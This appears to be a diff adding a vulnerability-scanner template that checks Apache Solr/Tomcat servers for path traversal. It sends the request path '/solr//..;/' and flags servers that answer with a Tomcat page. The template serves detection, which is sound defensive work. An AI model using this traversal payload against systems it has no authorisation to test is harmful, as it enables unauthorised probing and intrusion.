@@ -1,0 +1,24 @@
+
+id: custom-solr-path-traversal
+
+info:
+  name: Solr Apache Path Traversal
+  author: 0xParthJ
+  severity: high
+  reference: https://www.exploit-db.com/ghdb/5856
+  tags: solr,unauth
+
+requests:
+  - method: GET
+    path:
+      - '{{BaseURL}}/solr//..;/'
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - '<title>Apache Tomcat</title>'
+
+      - type: status
+        status:
+          - 200
